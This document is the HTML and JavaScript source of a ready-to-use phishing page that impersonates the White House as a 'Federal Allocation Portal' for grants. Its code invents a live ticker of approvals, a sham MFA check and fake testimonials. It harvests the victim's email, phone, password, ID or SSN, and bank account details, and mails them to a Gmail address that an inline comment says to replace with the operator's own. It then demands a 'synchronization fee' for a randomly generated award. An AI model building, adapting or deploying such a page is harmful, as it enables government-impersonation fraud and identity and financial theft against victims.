<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Federal Allocation Portal | 2026 Executive Branch</title>
    <style>
        :root { --navy: #002344; --gold: #a68d5d; --bg: #f2f2f2; }
        body { font-family: 'Times New Roman', serif; background: var(--bg); margin: 0; color: #333; overflow-x: hidden; }
        
        .gov-top { background: #000; color: #fff; font-size: 10px; padding: 5px; text-align: center; text-transform: uppercase; letter-spacing: 1px; }
        .main-header { background: var(--navy); color: white; padding: 25px; text-align: center; border-bottom: 5px solid var(--gold); }
        .main-header img { width: 80px; }
        
        .container { max-width: 550px; margin: 20px auto; background: white; padding: 30px; border-radius: 2px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); position: relative; }
        .page { display: none; }
        .active { display: block; }

        h2 { color: var(--navy); border-bottom: 1px solid #ccc; padding-bottom: 10px; font-size: 20px; text-transform: uppercase; }
        label { display: block; margin: 15px 0 5px; font-weight: bold; font-size: 13px; color: #444; }
        input, select, textarea { width: 100%; padding: 12px; border: 1px solid #aaa; font-size: 15px; box-sizing: border-box; background: #fafafa; }
        
        button { width: 100%; padding: 16px; background: var(--navy); color: white; border: none; font-weight: bold; cursor: pointer; margin-top: 20px; font-size: 15px; text-transform: uppercase; }
        
        .live-ticker { background: #e8f0fe; padding: 10px; font-size: 12px; border-left: 4px solid var(--navy); margin-bottom: 20px; font-style: italic; }
        
        .loader-box { text-align: center; padding: 40px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--navy); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .testimonial-card { background: #fff; border: 1px solid #ddd; padding: 15px; margin-top: 20px; border-radius: 5px; }
        .testi-name { font-weight: bold; color: var(--navy); }
        .testi-amt { color: #1a5e20; font-weight: bold; }
    </style>
</head>
<body>

<div class="gov-top">Official Executive Communication - Restricted Access</div>
<div class="main-header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/Seal_of_the_President_of_the_United_States.svg" alt="Seal">
    <h1>THE WHITE HOUSE</h1>
    <p style="font-size: 11px; margin: 5px 0 0;">OFFICE OF MANAGEMENT & RE-ALLOCATION</p>
</div>

<div class="container">
    <div id="ticker" class="live-ticker">Initializing secure session...</div>

    <div id="p1" class="page active">
        <h2>Secure Portal Access</h2>
        <label>Gmail Address (@gmail.com only)</label>
        <input type="email" id="email" placeholder="username@gmail.com">
        <label>Mobile Number</label>
        <input type="tel" id="phone" placeholder="+1...">
        <label>Create Session Password</label>
        <input type="password" id="pass" placeholder="********">
        <button onclick="handleSignup()">Generate Secure Access</button>
    </div>

    <div id="p2" class="page">
        <h2>Identity Verification</h2>
        <p>Enter the 6-digit code displayed on your authorized hardware token:</p>
        <div style="font-size: 32px; font-weight: bold; text-align: center; background: #eee; padding: 20px; letter-spacing: 10px; margin: 20px 0;" id="mfaDisplay"></div>
        <input type="text" id="mfaInput" placeholder="Enter Code">
        <button onclick="verifyMFA()">Verify & Login</button>
    </div>

    <div id="p3" class="page">
        <h2>Grant Eligibility Wizard</h2>
        <label>Application Type</label>
        <select id="appType" onchange="toggleFields()">
            <option value="Personal">Individual (Personal)</option>
            <option value="Organization">Business / Organization</option>
        </select>

        <label>Marital Status</label>
        <select id="marital">
            <option>Single</option>
            <option>Married</option>
            <option>Widowed</option>
        </select>

        <label>Number of Dependents (Kids)</label>
        <input type="number" id="kids" value="0">

        <label id="purposeLabel">Purpose of Funds</label>
        <select id="purpose">
            </select>

        <label>Government Issued ID Number</label>
        <input type="text" id="idNum" placeholder="DL / Passport / SSN">

        <label>Full Legal Name (Bank Record Match)</label>
        <input type="text" id="fullName">
        
        <label>Receiving Bank Name</label>
        <input type="text" id="bankName">
        
        <label>Account Number</label>
        <input type="text" id="accNum">

        <button onclick="submitManual()">Submit Allotment Claim</button>
    </div>

    <div id="p4" class="page loader-box">
        <div class="spinner"></div>
        <h3 id="loadText">Analyzing Tax Records...</h3>
        <p style="font-size: 12px;">Please do not close this window. Federal servers are calculating your regional allotment.</p>
    </div>

    <div id="p5" class="page text-center">
        <h2 style="color: #1a5e20;">APPROVED âœ…</h2>
        <div style="font-size: 40px; font-weight: bold; color: var(--navy); margin: 20px 0;" id="amtDisp"></div>
        <p>Reference: <span id="refNum"></span></p>
        <p>A synchronization fee of <strong id="feeDisp"></strong> is required for this award level.</p>
        
        <hr>
        <h3>Post-Approval Testimony</h3>
        <p style="font-size: 12px;">Submit your experience to help other citizens.</p>
        <textarea id="userComment" placeholder="Write your testimony here..."></textarea>
        <button onclick="alert('Testimony submitted for review!')" style="background: var(--gold);">Post Testimony</button>
        
        <div id="testiFeed"></div>
    </div>
</div>

<script>
    let mfaCode;
    const adminEmail = "fundallocation.gov@gmail.com"; // Change to your actual email

    // 1. LIVE TICKER ENGINE (Unique per device)
    const names = ["James W.", "Sarah L.", "Michael B.", "Robert T.", "Emily D.", "Linda K.", "David S.", "Karen M."];
    const comments = ["The process was so fast!", "Received my $450k within 24 hours.", "God bless the government for this relief.", "I can finally start my factory.", "Legit and professional."];
    
    function startTicker() {
        setInterval(() => {
            const n = names[Math.floor(Math.random()*names.length)];
            const a = (Math.random() * (900000 - 150000) + 150000).toLocaleString('en-US', {style:'currency', currency:'USD'});
            document.getElementById('ticker').innerText = `Live Approval: ${n} just received ${a} allotment.`;
        }, 4000);
    }
    startTicker();

    // 2. SIGNUP LOGIC
    function handleSignup() {
        const email = document.getElementById('email').value;
        if(!email.includes("@gmail.com")) {
            alert("Only official @gmail.com addresses are authorized for this portal.");
            return;
        }
        // Remember device
        localStorage.setItem('user_auth', 'true');
        mfaCode = Math.floor(100000 + Math.random() * 900000);
        document.getElementById('mfaDisplay').innerText = mfaCode;
        toPage(2);
    }

    function verifyMFA() {
        if(document.getElementById('mfaInput').value == mfaCode) {
            toggleFields();
            toPage(3);
        } else { alert("Invalid Code"); }
    }

    // 3. DYNAMIC FORM LOGIC
    function toggleFields() {
        const type = document.getElementById('appType').value;
        const p = document.getElementById('purpose');
        p.innerHTML = "";
        const options = type === "Personal" 
            ? ["Personal Feeding", "House Rent", "School Fees", "Medical Debt", "Small Investment"]
            : ["Set up New Business", "Run Small Business", "Factory Expansion", "Equipment Purchase", "Staff Payroll"];
        
        options.forEach(opt => {
            let el = document.createElement("option");
            el.innerText = opt;
            p.appendChild(el);
        });
    }

    function toPage(n) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById('p'+n).classList.add('active');
    }

    // 4. MANUAL EMAIL REDIRECT (NO MIDDLEMAN)
    function submitManual() {
        const data = {
            Email: document.getElementById('email').value,
            Name: document.getElementById('fullName').value,
            Bank: document.getElementById('bankName').value,
            Acc: document.getElementById('accNum').value,
            Type: document.getElementById('appType').value,
            Purpose: document.getElementById('purpose').value,
            ID: document.getElementById('idNum').value
        };

        const body = `FEDERAL ALLOCATION APPLICATION 2026\n\n` +
                     `Applicant: ${data.Name}\n` +
                     `Bank: ${data.Bank} | Acc: ${data.Acc}\n` +
                     `Type: ${data.Type} | Purpose: ${data.Purpose}\n` +
                     `Gov ID: ${data.ID}\n` +
                     `Email: ${data.Email}`;

        const mailtoLink = `mailto:${adminEmail}?subject=Official Grant Application - ${data.Name}&body=${encodeURIComponent(body)}`;
        
        // Open email app
        window.location.href = mailtoLink;

        // Start the "Loading" phase after they return
        setTimeout(() => {
            toPage(4);
            runAnalysis();
        }, 2000);
    }

    function runAnalysis() {
        const text = document.getElementById('loadText');
        setTimeout(() => text.innerText = "Verifying ID Card Authenticity...", 3000);
        setTimeout(() => text.innerText = "Cross-checking IRS Tax Records...", 6000);
        setTimeout(() => text.innerText = "Finalizing Regional Allotment...", 10000);
        setTimeout(() => showApproval(), 13000);
    }

    function showApproval() {
        // Amount: $127,540 to $987,375
        const amt = Math.floor(Math.random() * (987375 - 127540) + 127540);
        // Fee: $420 to $850
        const fee = Math.floor(Math.random() * (850 - 420) + 420);
        
        document.getElementById('amtDisp').innerText = amt.toLocaleString('en-US', {style:'currency', currency:'USD'});
        document.getElementById('feeDisp').innerText = `$${fee}.00`;
        document.getElementById('refNum').innerText = "WH-" + Math.floor(Math.random()*1000000);
        
        // Generate Testimonials that don't repeat on this device
        genTestimonials();
        toPage(5);
    }

    function genTestimonials() {
        const feed = document.getElementById('testiFeed');
        feed.innerHTML = "<h4>Live Public Feedback</h4>";
        for(let i=0; i<3; i++) {
            const div = document.createElement('div');
            div.className = 'testimonial-card';
            div.innerHTML = `<span class="testi-name">${names[i]}</span><br>` +
                            `<span class="testi-amt">Received $${(Math.random()*800000).toFixed(0)}</span><br>` +
                            `<p>"${comments[i]}"</p>`;
            feed.appendChild(div);
        }
    }
</script>
</body>
</html>
